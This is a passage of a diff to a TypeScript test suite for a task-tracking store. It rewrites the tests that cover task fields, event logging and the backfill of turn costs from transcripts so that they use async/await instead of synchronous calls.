+		const store = await open(join(root, "follow-up-link"));
+		const parent = await store.createTask("parent");
 		expect(parent.followUpOf).toBe(null);
-		const child = store.createTask("follow up");
-		const updated = store.updateTask(child.id, { followUpOf: parent.id });
+		const child = await store.createTask("follow up");
+		const updated = await store.updateTask(child.id, { followUpOf: parent.id });
 		expect(updated.followUpOf).toBe(parent.id);
 		// A same-project parent stores no project; a foreign one names it.
 		expect(updated.followUpOfProject).toBe(null);
-		expect(store.getTask(child.id)?.followUpOf).toBe(parent.id);
-		const foreign = store.updateTask(child.id, {
+		expect((await store.getTask(child.id))?.followUpOf).toBe(parent.id);
+		const foreign = await store.updateTask(child.id, {
 			followUpOf: "AGEN-30",
 			followUpOfProject: "agent-data",
 		});
 		expect(foreign.followUpOfProject).toBe("agent-data");
-		store.close();
-		const reopened = open(join(root, "follow-up-link"));
-		expect(reopened.getTask(child.id)?.followUpOf).toBe("AGEN-30");
-		expect(reopened.getTask(child.id)?.followUpOfProject).toBe("agent-data");
-		reopened.close();
+		await store.close();
+		const reopened = await open(join(root, "follow-up-link"));
+		expect((await reopened.getTask(child.id))?.followUpOf).toBe("AGEN-30");
+		expect((await reopened.getTask(child.id))?.followUpOfProject).toBe(
+			"agent-data",
+		);
+		await reopened.close();
 	});
 
-	test("updateTask stores dependsOn and it survives a reopen", () => {
-		const store = open(join(root, "depends-on-link"));
-		const parent = store.createTask("parent");
+	test("updateTask stores dependsOn and it survives a reopen", async () => {
+		const store = await open(join(root, "depends-on-link"));
+		const parent = await store.createTask("parent");
 		expect(parent.dependsOn).toEqual([]);
-		const child = store.createTask("depends on parent");
-		const updated = store.updateTask(child.id, {
+		const child = await store.createTask("depends on parent");
+		const updated = await store.updateTask(child.id, {
 			dependsOn: [parent.id],
 		});
 		expect(updated.dependsOn).toEqual([parent.id]);
-		expect(store.getTask(child.id)?.dependsOn).toEqual([parent.id]);
-		store.close();
-		const reopened = open(join(root, "depends-on-link"));
-		expect(reopened.getTask(child.id)?.dependsOn).toEqual([parent.id]);
-		reopened.close();
+		expect((await store.getTask(child.id))?.dependsOn).toEqual([parent.id]);
+		await store.close();
+		const reopened = await open(join(root, "depends-on-link"));
+		expect((await reopened.getTask(child.id))?.dependsOn).toEqual([parent.id]);
+		await reopened.close();
 	});
 
-	test("updateTask stores pushSha and it survives a reopen", () => {
-		const store = open(join(root, "push-sha-link"));
-		const task = store.createTask("merge me");
+	test("updateTask stores pushSha and it survives a reopen", async () => {
+		const store = await open(join(root, "push-sha-link"));
+		const task = await store.createTask("merge me");
 		expect(task.pushSha).toBe(null);
-		const updated = store.updateTask(task.id, { pushSha: "abc12345" });
+		const updated = await store.updateTask(task.id, { pushSha: "abc12345" });
 		expect(updated.pushSha).toBe("abc12345");
-		store.close();
-		const reopened = open(join(root, "push-sha-link"));
-		expect(reopened.getTask(task.id)?.pushSha).toBe("abc12345");
-		expect(reopened.updateTask(task.id, { pushSha: null }).pushSha).toBe(null);
-		reopened.close();
+		await store.close();
+		const reopened = await open(join(root, "push-sha-link"));
+		expect((await reopened.getTask(task.id))?.pushSha).toBe("abc12345");
+		expect(
+			(await reopened.updateTask(task.id, { pushSha: null })).pushSha,
+		).toBe(null);
+		await reopened.close();
 	});
 
-	test("updateTask round-trips the PR-mode fields and they survive a reopen", () => {
-		const store = open(join(root, "pr-task-fields"));
-		const task = store.createTask("pr me");
+	test("updateTask round-trips the PR-mode fields and they survive a reopen", async () => {
+		const store = await open(join(root, "pr-task-fields"));
+		const task = await store.createTask("pr me");
 		expect(task.prNumber).toBe(null);
 		expect(task.prUrl).toBe(null);
 		expect(task.prHeadSha).toBe(null);
@@ -1259,7 +1372,7 @@ describe("keptFiles", () => {
 		expect(task.sourcePrHeadSha).toBe(null);
 		expect(task.sourcePrCrossRepo).toBe(false);
 		expect(task.sourcePrDependabot).toBe(false);
-		const updated = store.updateTask(task.id, {
+		const updated = await store.updateTask(task.id, {
 			prNumber: 7,
 			prUrl: "https://github.com/octo/repo/pull/7",
 			prHeadSha: "def67890",
@@ -1279,9 +1392,9 @@ describe("keptFiles", () => {
 		expect(updated.sourcePrHeadSha).toBe("abc12300");
 		expect(updated.sourcePrCrossRepo).toBe(true);
 		expect(updated.sourcePrDependabot).toBe(true);
-		store.close();
-		const reopened = open(join(root, "pr-task-fields"));
-		const back = reopened.getTask(task.id)!;
+		await store.close();
+		const reopened = await open(join(root, "pr-task-fields"));
+		const back = (await reopened.getTask(task.id))!;
 		expect(back.prNumber).toBe(7);
 		expect(back.prUrl).toBe("https://github.com/octo/repo/pull/7");
 		expect(back.prHeadSha).toBe("def67890");
@@ -1291,7 +1404,7 @@ describe("keptFiles", () => {
 		expect(back.sourcePrHeadSha).toBe("abc12300");
 		expect(back.sourcePrCrossRepo).toBe(true);
 		expect(back.sourcePrDependabot).toBe(true);
-		const cleared = reopened.updateTask(task.id, {
+		const cleared = await reopened.updateTask(task.id, {
 			prNumber: null,
 			prUrl: null,
 			prHeadSha: null,
@@ -1311,10 +1424,10 @@ describe("keptFiles", () => {
 		expect(cleared.sourcePrHeadSha).toBe(null);
 		expect(cleared.sourcePrCrossRepo).toBe(false);
 		expect(cleared.sourcePrDependabot).toBe(false);
-		reopened.close();
+		await reopened.close();
 	});
 
-	test("a database from before OTTR-760 converges to the source PR columns", () => {
+	test("a database from before OTTR-760 converges to the source PR columns", async () => {
 		const dir = join(root, "pre-ottr-760-columns");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"));
@@ -1354,63 +1467,66 @@ describe("keptFiles", () => {
 			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at) VALUES ('t1', 'old', 'p', 'merging', 'idle', 1, 1)",
 		);
 		db.close();
-		const store = open(dir);
-		const back = store.getTask("t1")!;
+		const store = await open(dir);
+		const back = (await store.getTask("t1"))!;
 		expect(back.sourcePrNumber).toBe(null);
 		expect(back.sourcePrCrossRepo).toBe(false);
 		expect(back.sourcePrDependabot).toBe(false);
-		store.updateTask("t1", { sourcePrNumber: 20, sourcePrDependabot: true });
-		expect(store.getTask("t1")!.sourcePrNumber).toBe(20);
-		store.close();
+		await store.updateTask("t1", {
+			sourcePrNumber: 20,
+			sourcePrDependabot: true,
+		});
+		expect((await store.getTask("t1"))!.sourcePrNumber).toBe(20);
+		await store.close();
 	});
 
-	test("updateTask stores mergeHead and it survives a reopen", () => {
-		const store = open(join(root, "merge-head-link"));
-		const task = store.createTask("merge me");
+	test("updateTask stores mergeHead and it survives a reopen", async () => {
+		const store = await open(join(root, "merge-head-link"));
+		const task = await store.createTask("merge me");
 		expect(task.mergeHead).toBe(null);
-		const updated = store.updateTask(task.id, { mergeHead: "abc12345" });
+		const updated = await store.updateTask(task.id, { mergeHead: "abc12345" });
 		expect(updated.mergeHead).toBe("abc12345");
-		store.close();
-		const reopened = open(join(root, "merge-head-link"));
-		expect(reopened.getTask(task.id)?.mergeHead).toBe("abc12345");
-		expect(reopened.updateTask(task.id, { mergeHead: null }).mergeHead).toBe(
-			null,
-		);
-		reopened.close();
+		await store.close();
+		const reopened = await open(join(root, "merge-head-link"));
+		expect((await reopened.getTask(task.id))?.mergeHead).toBe("abc12345");
+		expect(
+			(await reopened.updateTask(task.id, { mergeHead: null })).mergeHead,
+		).toBe(null);
+		await reopened.close();
 	});
 
-	test("updateTask stores research and report and they survive a reopen", () => {
-		const store = open(join(root, "research-link"));
-		const task = store.createTask("research this");
+	test("updateTask stores research and report and they survive a reopen", async () => {
+		const store = await open(join(root, "research-link"));
+		const task = await store.createTask("research this");
 		expect(task.research).toBe(false);
 		expect(task.report).toBe(null);
-		const updated = store.updateTask(task.id, {
+		const updated = await store.updateTask(task.id, {
 			research: true,
 			report: "# Findings",
 		});
 		expect(updated.research).toBe(true);
 		expect(updated.report).toBe("# Findings");
-		store.close();
-		const reopened = open(join(root, "research-link"));
-		expect(reopened.getTask(task.id)?.research).toBe(true);
-		expect(reopened.getTask(task.id)?.report).toBe("# Findings");
-		reopened.close();
+		await store.close();
+		const reopened = await open(join(root, "research-link"));
+		expect((await reopened.getTask(task.id))?.research).toBe(true);
+		expect((await reopened.getTask(task.id))?.report).toBe("# Findings");
+		await reopened.close();
 	});
 
-	test("clearing research survives a reopen and keeps the report", () => {
-		const store = open(join(root, "research-unmark"));
-		const task = store.createTask("coerced card");
-		store.updateTask(task.id, { research: true, report: "# Findings" });
-		const cleared = store.updateTask(task.id, { research: false });
+	test("clearing research survives a reopen and keeps the report", async () => {
+		const store = await open(join(root, "research-unmark"));
+		const task = await store.createTask("coerced card");
+		await store.updateTask(task.id, { research: true, report: "# Findings" });
+		const cleared = await store.updateTask(task.id, { research: false });
 		expect(cleared.research).toBe(false);
-		store.close();
-		const reopened = open(join(root, "research-unmark"));
-		expect(reopened.getTask(task.id)?.research).toBe(false);
-		expect(reopened.getTask(task.id)?.report).toBe("# Findings");
-		reopened.close();
+		await store.close();
+		const reopened = await open(join(root, "research-unmark"));
+		expect((await reopened.getTask(task.id))?.research).toBe(false);
+		expect((await reopened.getTask(task.id))?.report).toBe("# Findings");
+		await reopened.close();
 	});
 
-	test("opening a pre-research database backfills the columns", () => {
+	test("opening a pre-research database backfills the columns", async () => {
 		const dir = join(root, "research-legacy");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"));
@@ -1422,26 +1538,26 @@ describe("keptFiles", () => {
 			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at) VALUES ('res1', 't', 'p', 'done', 'idle', 1, 1)",
 		);
 		db.close();
-		const store = open(dir);
-		const task = store.getTask("res1");
+		const store = await open(dir);
+		const task = await store.getTask("res1");
 		expect(task?.research).toBe(false);
 		expect(task?.report).toBe(null);
 		expect(task?.steps).toBe("unknown");
-		store.close();
+		await store.close();
 	});
 
-	test("steps round-trips a close and reopen", () => {
-		const store = open(join(root, "steps-roundtrip"));
-		const task = store.createTask("steps card");
+	test("steps round-trips a close and reopen", async () => {
+		const store = await open(join(root, "steps-roundtrip"));
+		const task = await store.createTask("steps card");
 		expect(task.steps).toBe("unknown");
-		store.updateTask(task.id, { steps: "yes" });
-		store.close();
-		const reopened = open(join(root, "steps-roundtrip"));
-		expect(reopened.getTask(task.id)?.steps).toBe("yes");
-		reopened.close();
+		await store.updateTask(task.id, { steps: "yes" });
+		await store.close();
+		const reopened = await open(join(root, "steps-roundtrip"));
+		expect((await reopened.getTask(task.id))?.steps).toBe("yes");
+		await reopened.close();
 	});
 
-	test("opening a pre-kept_files database backfills the column", () => {
+	test("opening a pre-kept_files database backfills the column", async () => {
 		const dir = join(root, "kept-legacy");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"));
@@ -1453,17 +1569,17 @@ describe("keptFiles", () => {
 			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at) VALUES ('kept1', 't', 'p', 'in_progress', 'needs_you', 1, 1)",
 		);
 		db.close();
-		const store = open(dir);
-		expect(store.getTask("kept1")?.keptFiles).toEqual([]);
-		store.close();
+		const store = await open(dir);
+		expect((await store.getTask("kept1"))?.keptFiles).toEqual([]);
+		await store.close();
 	});
 });
 
 describe("work check log", () => {
-	test("a run's warn survives a reopen; rows without one stay warnless", () => {
-		const store = open(join(root, "wc-log"));
-		const task = store.createTask("checked work");
-		store.updateTask(task.id, {
+	test("a run's warn survives a reopen; rows without one stay warnless", async () => {
+		const store = await open(join(root, "wc-log"));
+		const task = await store.createTask("checked work");
+		await store.updateTask(task.id, {
 			workCheckLog: [
 				{
 					at: 1000,
@@ -1484,41 +1600,42 @@ describe("work check log", () => {
 				},
 			],
 		});
-		store.close();
-		const reopened = open(join(root, "wc-log"));
-		const log = reopened.getTask(task.id)?.workCheckLog ?? [];
+		await store.close();
+		const reopened = await open(join(root, "wc-log"));
+		const log = (await reopened.getTask(task.id))?.workCheckLog ?? [];
 		expect(log).toHaveLength(2);
 		expect(log[0]?.warn).toBe(
 			"The check model zai/glm-5.3-flash:medium is the same model as the run it checks — no second-model opinion.",
 		);
 		expect(log[1]?.warn).toBeUndefined();
-		reopened.close();
+		await reopened.close();
 	});
 });
 
 describe("uncommittedFiles", () => {
-	test("updateTask stores and clears the list; fresh stores default to empty", () => {
-		const store = open(join(root, "uncommitted"));
-		const task = store.createTask("capture me");
+	test("updateTask stores and clears the list; fresh stores default to empty", async () => {
+		const store = await open(join(root, "uncommitted"));
+		const task = await store.createTask("capture me");
 		expect(task.uncommittedFiles).toEqual([]);
-		const withFiles = store.updateTask(task.id, {
+		const withFiles = await store.updateTask(task.id, {
 			uncommittedFiles: ["research-report.md", "scratch.txt"],
 		});
 		expect(withFiles.uncommittedFiles).toEqual([
 			"research-report.md",
 			"scratch.txt",
 		]);
-		expect(store.getTask(task.id)?.uncommittedFiles).toEqual([
+		expect((await store.getTask(task.id))?.uncommittedFiles).toEqual([
 			"research-report.md",
 			"scratch.txt",
 		]);
 		expect(
-			store.updateTask(task.id, { uncommittedFiles: [] }).uncommittedFiles,
+			(await store.updateTask(task.id, { uncommittedFiles: [] }))
+				.uncommittedFiles,
 		).toEqual([]);
-		store.close();
+		await store.close();
 	});
 
-	test("opening a pre-uncommitted_files database backfills the column", () => {
+	test("opening a pre-uncommitted_files database backfills the column", async () => {
 		const dir = join(root, "uncommitted-legacy");
 		mkdirSync(join(dir, ".tasks"), { recursive: true });
 		const db = new Database(join(dir, ".tasks", "tasks.db"));
@@ -1530,33 +1647,32 @@ describe("uncommittedFiles", () => {
 			"INSERT INTO tasks (id, title, prompt, stage, state, created_at, updated_at) VALUES ('wt1', 't', 'p', 'done', 'idle', 1, 1)",
 		);
 		db.close();
-		const store = open(dir);
-		expect(store.getTask("wt1")?.uncommittedFiles).toEqual([]);
-		store.close();
+		const store = await open(dir);
+		expect((await store.getTask("wt1"))?.uncommittedFiles).toEqual([]);
+		await store.close();
 	});
 });
 
 describe("events", () => {
-	test("createTask records a create event and the initial queued state", () => {
-		const store = open(join(root, "stats-create"));
-		const task = store.createTask("count me");
-		const events = store.events();
+	test("createTask records a create event and the initial queued state", async () => {
+		const store = await open(join(root, "stats-create"));
+		const task = await store.createTask("count me");
+		const events = await store.events();
 		expect(events.map((e) => [e.kind, e.taskId, e.to])).toEqual([
 			["create", task.id, "todo"],
 			["state", task.id, "queued"],
 		]);
-		store.close();
+		await store.close();
 	});
 
-	test("stage and state transitions record from/to; unchanged or same-value patches record nothing", () => {
-		const store = open(join(root, "stats-transitions"));
-		const task = store.createTask("move me");
-		store.updateTask(task.id, { state: "running", stage: "in_progress" });
-		store.updateTask(task.id, { state: "needs_you", needsReason: "ask" });
-		store.updateTask(task.id, { state: "queued", pendingPrompt: "." });
+	test("stage and state transitions record from/to; unchanged or same-value patches record nothing", async () => {
+		const store = await open(join(root, "stats-transitions"));
+		const task = await store.createTask("move me");
+		await store.updateTask(task.id, { state: "running", stage: "in_progress" });
+		await store.updateTask(task.id, { state: "needs_you", needsReason: "ask" });
+		await store.updateTask(task.id, { state: "queued", pendingPrompt: "." });
 		expect(
-			store
-				.events()
+			(await store.events())
 				.filter((e) => e.kind === "stage" || e.kind === "state")
 				.map((e) => [e.kind, e.from, e.to]),
 		).toEqual([
@@ -1567,29 +1683,35 @@ describe("events", () => {
 			["state", "needs_you", "queued"],
 		]);
 		// Non-transition patch (reorder writes queuedAt) and same-value state: no new events.
-		const before = store.events();
-		store.updateTask(task.id, { queuedAt: Date.now() });
-		store.updateTask(task.id, { state: "queued" });
-		expect(store.events()).toEqual(before);
-		store.close();
+		const before = await store.events();
+		await store.updateTask(task.id, { queuedAt: Date.now() });
+		await store.updateTask(task.id, { state: "queued" });
+		expect(await store.events()).toEqual(before);
+		await store.close();
 	});
 
-	test("finishTurn records an error event except for deliberate cancels", () => {
-		const store = open(join(root, "stats-errors"));
-		const task = store.createTask("fail me");
-		store.finishTurn(store.startTurn(task.id, "work", "fail me", null).id, {
-			endedAt: Date.now(),
-			error: "boom",
-		});
-		store.finishTurn(store.startTurn(task.id, "work", "fail me", null).id, {
-			endedAt: Date.now(),
-			error: "cancelled",
-		});
-		const errors = store.events().filter((e) => e.kind === "error");
+	test("finishTurn records an error event except for deliberate cancels", async () => {
+		const store = await open(join(root, "stats-errors"));
+		const task = await store.createTask("fail me");
+		await store.finishTurn(
+			(await store.startTurn(task.id, "work", "fail me", null)).id,
+			{
+				endedAt: Date.now(),
+				error: "boom",
+			},
+		);
+		await store.finishTurn(
+			(await store.startTurn(task.id, "work", "fail me", null)).id,
+			{
+				endedAt: Date.now(),
+				error: "cancelled",
+			},
+		);
+		const errors = (await store.events()).filter((e) => e.kind === "error");
 		expect(errors.map((e) => [e.taskId, e.detail])).toEqual([
 			[task.id, "boom"],
 		]);
-		store.close();
+		await store.close();
 	});
 });
 
@@ -1630,20 +1752,20 @@ describe("turn cost capture", () => {
 		);
 	}
 
-	test("finishTurn fills cost from the transcript window", () => {
+	test("finishTurn fills cost from the transcript window", async () => {
 		const dir = join(root, "cost-finish");
-		const store = open(dir);
-		const t = store.updateTask(store.createTask("costly").id, {
+		const store = await open(dir);
+		const t = await store.updateTask((await store.createTask("costly")).id, {
 			sessionId: sid,
 		});
-		const a = store.startTurn(t.id, "work", "a", null);
+		const a = await store.startTurn(t.id, "work", "a", null);
 		// One record inside [started_at, ended_at], one after the turn ended.
 		writeTranscript(store.sessionsDir, sid, [
 			usageLine(a.startedAt + 1000, { input: 10, output: 1, cost: 0.25 }),
 			usageLine(a.startedAt + 5000, { input: 99, output: 9, cost: 9 }),
 		]);
-		store.finishTurn(a.id, { endedAt: a.startedAt + 2000 });
-		store.close();
+		await store.finishTurn(a.id, { endedAt: a.startedAt + 2000 });
+		await store.close();
 
 		const raw = new Database(join(dir, ".tasks", "tasks.db"));
 		const rows = raw
@@ -1672,18 +1794,18 @@ describe("turn cost capture", () => {
 		]);
 	});
 
-	test("two turns of one session split the transcript by their timestamp windows", () => {
+	test("two turns of one session split the transcript by their timestamp windows", async () => {
 		const dir = join(root, "cost-split");
-		const store = open(dir);
+		const store = await open(dir);
 		const sessionsDir = store.sessionsDir;
-		const t = store.updateTask(store.createTask("costly").id, {
+		const t = await store.updateTask((await store.createTask("costly")).id, {
 			sessionId: sid,
 		});
-		const a = store.startTurn(t.id, "work", "a", null);
-		const b = store.startTurn(t.id, "work", "b", null);
-		store.finishTurn(a.id, { endedAt: a.startedAt + 1000 });
-		store.finishTurn(b.id, { endedAt: b.startedAt + 1000 });
-		store.close();
+		const a = await store.startTurn(t.id, "work", "a", null);
+		const b = await store.startTurn(t.id, "work", "b", null);
+		await store.finishTurn(a.id, { endedAt: a.startedAt + 1000 });
+		await store.finishTurn(b.id, { endedAt: b.startedAt + 1000 });
+		await store.close();
 		// Pin the two windows apart (raw write: the store is closed) and lay the
 		// transcript over them; the backfill owns each message by its record timestamp.
 		const T = Date.parse("2026-09-27T10:00:00.000Z");
@@ -1705,14 +1827,14 @@ describe("turn cost capture", () => {
 			usageLine(T + 1_400_000, { input: 99, output: 9, cost: 9 }), // after both
 		]);
 		// The backfill runs on open and splits the transcript by window.
-		const reopened = open(dir);
+		const reopened = await open(dir);
 		expect(
-			reopened.perfFacts().turns.sort((x, y) => x.endedAt - y.endedAt),
+			(await reopened.perfFacts()).turns.sort((x, y) => x.endedAt - y.endedAt),
 		).toEqual([
 			{ endedAt: T + 600_000, failed: false, cost: 0.25 },
 			{ endedAt: T + 1_300_000, failed: false, cost: 0.5 },
 		]);
-		reopened.close();
+		await reopened.close();
 		// Backfill persisted the per-window costs.
 		const raw2 = new Database(join(dir, ".tasks", "tasks.db"));
 		const costs = raw2
@@ -1722,33 +1844,37 @@ describe("turn cost capture", () => {
 		expect(costs).toEqual([{ cost: 0.25 }, { cost: 0.5 }]);
 	});
 
-	test("a session without a transcript keeps cost NULL and never fails the turn", () => {
+	test("a session without a transcript keeps cost NULL and never fails the turn", async () => {
 		const dir = join(root, "cost-missing");
-		const store = open(dir);
-		const t = store.updateTask(store.createTask("no file").id, {
+		const store = await open(dir);
+		const t = await store.updateTask((await store.createTask("no file")).id, {
 			sessionId: sid,
 		});
-		const turn = store.startTurn(t.id, "work", "p", null);
-		const ended = store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
+		const turn = await store.startTurn(t.id, "work", "p", null);
+		const ended = await store.finishTurn(turn.id, {
+			endedAt: turn.startedAt + 1000,
+		});
 		expect(ended.endedAt).toBe(turn.startedAt + 1000);
-		const orphan = store.startTurn(
-			store.createTask("no session").id,
+		const orphan = await store.startTurn(
+			(await store.createTask("no session")).id,
 			"work",
 			"p",
 			null,
 		);
-		store.finishTurn(orphan.id, { endedAt: orphan.startedAt + 1000 });
-		expect(store.perfFacts().turns.every((x) => x.cost === null)).toBe(true);
-		store.close();
+		await store.finishTurn(orphan.id, { endedAt: orphan.startedAt + 1000 });
+		expect((await store.perfFacts()).turns.every((x) => x.cost === null)).toBe(
+			true,
+		);
+		await store.close();
 	});
 
-	test("an owned window without usage writes zeros, not NULL", () => {
+	test("an owned window without usage writes zeros, not NULL", async () => {
 		const dir = join(root, "cost-zeros");
-		const store = open(dir);
-		const t = store.updateTask(store.createTask("quiet").id, {
+		const store = await open(dir);
+		const t = await store.updateTask((await store.createTask("quiet")).id, {
 			sessionId: sid,
 		});
-		const turn = store.startTurn(t.id, "work", "p", null);
+		const turn = await store.startTurn(t.id, "work", "p", null);
 		// The session ran in the window (a user record) but billed nothing there.
 		writeTranscript(store.sessionsDir, sid, [
 			JSON.stringify({
@@ -1757,8 +1883,8 @@ describe("turn cost capture", () => {
 				message: { role: "user", content: "go" },
 			}),
 		]);
-		store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
-		store.close();
+		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
+		await store.close();
 		const raw = new Database(join(dir, ".tasks", "tasks.db"));
 		const row = raw
 			.query<{ tokens_in: number; cost: number }, []>(
@@ -1769,78 +1895,81 @@ describe("turn cost capture", () => {
 		expect(row).toEqual({ tokens_in: 0, cost: 0 });
 	});
 
-	test("a turn of a replaced session keeps cost NULL in the backfill", () => {
+	test("a turn of a replaced session keeps cost NULL in the backfill", async () => {
 		const dir = join(root, "cost-replaced");
 		const oldSid = "dddd0000-0000-0000-0000-000000000301";
 		const newSid = "dddd0000-0000-0000-0000-000000000302";
-		const store = open(dir);
-		const t = store.updateTask(store.createTask("restarted").id, {
+		const store = await open(dir);
+		const t = await store.updateTask((await store.createTask("restarted")).id, {
 			sessionId: oldSid,
 		});
-		const old = store.startTurn(t.id, "work", "p", null);
-		store.finishTurn(old.id, { endedAt: old.startedAt + 1000 }); // no file yet: NULL
+		const old = await store.startTurn(t.id, "work", "p", null);
+		await store.finishTurn(old.id, { endedAt: old.startedAt + 1000 }); // no file yet: NULL
 		// The old session's own transcript bills cost 2 inside the old turn's window...
 		writeTranscript(store.sessionsDir, oldSid, [
 			usageLine(old.startedAt + 100, { input: 1, output: 1, cost: 2 }),
 		]);
 		// ...but the task moved to a new session that started after the old turn ended.
-		store.updateTask(t.id, { sessionId: newSid });
+		await store.updateTask(t.id, { sessionId: newSid });
 		const T = old.startedAt + 60_000;
 		writeTranscript(store.sessionsDir, newSid, [
 			usageLine(T, { input: 5, output: 5, cost: 0.5 }),
 		]);
-		store.close();
-		const reopened = open(dir);
+		await store.close();
+		const reopened = await open(dir);
 		// Not a confirmed zero: the current transcript cannot speak for that turn.
-		expect(reopened.perfFacts().turns[0]?.cost).toBeNull();
-		reopened.close();
+		expect((await reopened.perfFacts()).turns[0]?.cost).toBeNull();
+		await reopened.close();
 	});
 
-	test("a malformed transcript keeps cost NULL at turn end, and a repaired one fills on reopen", () => {
+	test("a malformed transcript keeps cost NULL at turn end, and a repaired one fills on reopen", async () => {
 		const dir = join(root, "cost-malformed-finish");
-		const store = open(dir);
-		const t = store.updateTask(store.createTask("garbled").id, {
+		const store = await open(dir);
+		const t = await store.updateTask((await store.createTask("garbled")).id, {
 			sessionId: sid,
 		});
-		const turn = store.startTurn(t.id, "work", "p", null);
+		const turn = await store.startTurn(t.id, "work", "p", null);
 		const good = usageLine(turn.startedAt + 100, {
 			input: 3,
 			output: 1,
 			cost: 0.4,
 		});
 		writeTranscript(store.sessionsDir, sid, [good, "{broken"]);
-		store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
-		expect(store.perfFacts().turns[0]?.cost).toBeNull();
+		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
+		expect((await store.perfFacts()).turns[0]?.cost).toBeNull();
 		writeTranscript(store.sessionsDir, sid, [good]);
-		store.close();
-		const reopened = open(dir);
-		expect(reopened.perfFacts().turns[0]?.cost).toBe(0.4);
-		reopened.close();
+		await store.close();
+		const reopened = await open(dir);
+		expect((await reopened.perfFacts()).turns[0]?.cost).toBe(0.4);
+		await reopened.close();
 	});
 
-	test("a malformed transcript keeps cost NULL in the backfill until repaired", () => {
+	test("a malformed transcript keeps cost NULL in the backfill until repaired", async () => {
 		const dir = join(root, "cost-malformed-backfill");
 		const sid3 = "eeee0000-0000-0000-0000-000000000401";
-		const store = open(dir);
-		const t = store.updateTask(store.createTask("garbled later").id, {
-			sessionId: sid3,
-		});
-		const turn = store.startTurn(t.id, "work", "p", null);
-		store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 }); // no file: NULL
+		const store = await open(dir);
+		const t = await store.updateTask(
+			(await store.createTask("garbled later")).id,
+			{
+				sessionId: sid3,
+			},
+		);
+		const turn = await store.startTurn(t.id, "work", "p", null);
+		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 }); // no file: NULL
 		const good = usageLine(turn.startedAt + 100, {
 			input: 3,
 			output: 1,
 			cost: 0.6,
 		});
 		writeTranscript(store.sessionsDir, sid3, [good, "not json"]);
-		store.close();
-		const first = open(dir);
-		expect(first.perfFacts().turns[0]?.cost).toBeNull();
+		await store.close();
+		const first = await open(dir);
+		expect((await first.perfFacts()).turns[0]?.cost).toBeNull();
 		writeTranscript(first.sessionsDir, sid3, [good]);
-		first.close();
-		const second = open(dir);
-		expect(second.perfFacts().turns[0]?.cost).toBe(0.6);
-		second.close();
+		await first.close();
+		const second = await open(dir);
+		expect((await second.perfFacts()).turns[0]?.cost).toBe(0.6);
+		await second.close();
 	});
 
 	// The subagent folder sits beside the session file (`<ts>_<sid>/`). Breakages are built
@@ -1858,14 +1987,17 @@ describe("turn cost capture", () => {
 		],
 	];
 	for (const [label, breakIt] of subBreaks) {
-		test(`${label} keeps cost NULL at turn end and in the backfill until repaired`, () => {
+		test(`${label} keeps cost NULL at turn end and in the backfill until repaired`, async () => {
 			const dir = join(root, `cost-sub-${label.length}`);
 			const sid4 = `ffff0000-0000-0000-0000-00000000050${label.length % 10}`;
-			const store = open(dir);
-			const t = store.updateTask(store.createTask("subagents").id, {
-				sessionId: sid4,
-			});
-			const turn = store.startTurn(t.id, "work", "p", null);
+			const store = await open(dir);
+			const t = await store.updateTask(
+				(await store.createTask("subagents")).id,
+				{
+					sessionId: sid4,
+				},
+			);
+			const turn = await store.startTurn(t.id, "work", "p", null);
 			const at = turn.startedAt + 100;
 			writeTranscript(store.sessionsDir, sid4, [
 				usageLine(at, { input: 1, output: 1, cost: 1 }),
@@ -1875,12 +2007,12 @@ describe("turn cost capture", () => {
 				`2026-09-27T10-00-00-000Z_${sid4}`,
 			);
 			breakIt(subDir);
-			store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
-			expect(store.perfFacts().turns[0]?.cost).toBeNull(); // turn end
-			store.close();
-			const first = open(dir);
-			expect(first.perfFacts().turns[0]?.cost).toBeNull(); // backfill
-			first.close();
+			await store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
+			expect((await store.perfFacts()).turns[0]?.cost).toBeNull(); // turn end
+			await store.close();
+			const first = await open(dir);
+			expect((await first.perfFacts()).turns[0]?.cost).toBeNull(); // backfill
+			await first.close();
 			// Repair: a readable folder with one subagent file that bills 2 more.
 			rmSync(subDir, { recursive: true, force: true });
 			mkdirSync(subDir, { recursive: true });
@@ -1888,39 +2020,39 @@ describe("turn cost capture", () => {
 				join(subDir, "0-sub.jsonl"),
 				usageLine(at + 10, { input: 1, output: 1, cost: 2 }),
 			);
-			const second = open(dir);
-			expect(second.perfFacts().turns[0]?.cost).toBe(3);
-			second.close();
+			const second = await open(dir);
+			expect((await second.perfFacts()).turns[0]?.cost).toBe(3);
+			await second.close();
 		});
 	}
 
-	test("reopen backfills an old turn's cost once its transcript exists", () => {
+	test("reopen backfills an old turn's cost once its transcript exists", async () => {
 		const dir = join(root, "cost-backfill");
 		const sid2 = "cccc0000-0000-0000-0000-000000000202";
-		const store = open(dir);
-		const t = store.updateTask(store.createTask("old work").id, {
+		const store = await open(dir);
+		const t = await store.updateTask((await store.createTask("old work")).id, {
 			sessionId: sid2,
 		});
-		const turn = store.startTurn(t.id, "work", "p", null);
-		store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
-		expect(store.perfFacts().turns[0]?.cost).toBeNull(); // no transcript yet
+		const turn = await store.startTurn(t.id, "work", "p", null);
+		await store.finishTurn(turn.id, { endedAt: turn.startedAt + 1000 });
+		expect((await store.perfFacts()).turns[0]?.cost).toBeNull(); // no transcript yet
 		writeTranscript(store.sessionsDir, sid2, [
 			usageLine(turn.startedAt + 100, { input: 7, output: 3, cost: 0.75 }),
 		]);
-		store.close();
+		await store.close();
 		// The backfill runs on open, before any caller touches the store.
-		const reopened = open(dir);
-		expect(reopened.perfFacts().turns).toEqual([
+		const reopened = await open(dir);
+		expect((await reopened.perfFacts()).turns).toEqual([
